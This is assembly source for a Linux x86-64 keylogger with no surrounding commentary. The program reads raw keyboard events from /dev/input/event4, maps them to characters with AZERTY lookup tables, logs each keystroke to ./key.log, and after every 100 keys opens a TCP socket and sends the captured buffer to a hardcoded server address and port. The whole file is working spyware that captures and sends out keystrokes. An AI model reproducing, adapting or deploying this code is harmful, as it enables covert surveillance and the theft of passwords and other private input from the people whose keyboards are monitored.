section .text
  global _start

_start:
  mov rax, 2
  mov rdi, file
  mov rsi, 00001102
  mov rdx, 422
  syscall

  mov [fd], rax

  test rax, rax
  js error 
  
  mov rax, 2
  mov rdi, source
  xor rsi, rsi
  syscall

  mov [sd], rax

  test rax, rax
  js error

  mov rax, 57
  syscall

  jmp readKey


  mov rax, 60
  xor rdi, rdi
  syscall

readKey:
  xor rax, rax
  mov rsi, event
  mov rdx, 24
  mov rdi, [sd]
  syscall

  mov byte al, [event + 16]
  cmp ax, 0x0
  je readKey
  cmp ax, 0x4
  je readKey

  mov byte al, [event + 18]
  cmp al, 42
  je checkShift

  cmp al, 54
  je checkShift

  mov byte al , [event + 20]
  cmp al, 0x0
  je readKey

  mov byte al , [event + 18]
  cmp byte [mode], 1
  je upperKey
  jne lowerKey

checkShift:
  mov byte al, [event + 20]
  cmp al, 0x1
  je pressShift
  jne releaseShift

pressShift:
  mov byte [mode], 1
  jmp readKey

releaseShift:
  mov byte [mode], 0
  jmp readKey

upperKey:
  mov byte bl, [upperKeys + eax] 
  mov byte [key], bl

  jmp writeKey

lowerKey:
  mov byte bl, [lowerKeys + eax]
  mov byte [key], bl

  jmp writeKey

writeKey:
  mov rax, 1
  mov rdi, [fd]
  mov rsi, key
  mov rdx, 1
  syscall

  mov al, [counter]
  mov bl, [key]
  mov byte [keys + eax],bl 

  add byte [counter], 1
  cmp byte [counter], 100
  je sendKeys

  jmp readKey 

sendKeys:
  mov rax, 41
  mov rdi, 0x2 
  mov rsi, 0x1
  xor rdx, rdx
  syscall
 
  mov [socket], rax

  mov rax, 42
  mov rdi, [socket]

  mov word [addr], 0x2 
  mov bx, [port]
  mov word [addr + 2], bx 
  mov ebx, [serv]
  mov dword [addr + 4], ebx 
 
  mov rsi, addr
  mov rdx, 16
  syscall

  mov rax, 1
  mov rdi, [socket]
  mov rsi, keys
  mov rdx, 100
  syscall

  mov rax, 3
  mov rdi, [socket]
  syscall

  mov byte [counter], 0
  jmp readKey

error:
  mov rax, 1
  mov rdi, 1
  mov rsi, errorMsg
  mov rdx, errorMsgLen
  syscall

  mov rax, 60
  mov rdi, 1
  mov rsi, keys
  mov rdx, 100
  syscall

  jmp readKey

section .data
  errorMsg db "must be run as root", 0xa
  errorMsgLen equ $ - errorMsg

  source db "/dev/input/event4", 0
  sd dq 0

  file db "./key.log", 0
  fd dq 0

  lowerKeys dw `??\&2\"\'(\-7\_90-=\b\tazertyuiop[]\n?qsdfghjklm,'\`?\wxcvbn,.:?*?\s?`
  upperKeys dw `??1234567890-=\b\tAZERTYUIOP[]\n?QSDFGHJKLM,'\`?\WXCVBN?./?*?\s?`

  serv dd 0x0100007f
  port dw 0x3905

  socket dq 0

  mode db 0
  counter db 0

section .bss
  event resb 24
  key resb 1
  keys resb 100
  addr resb 16
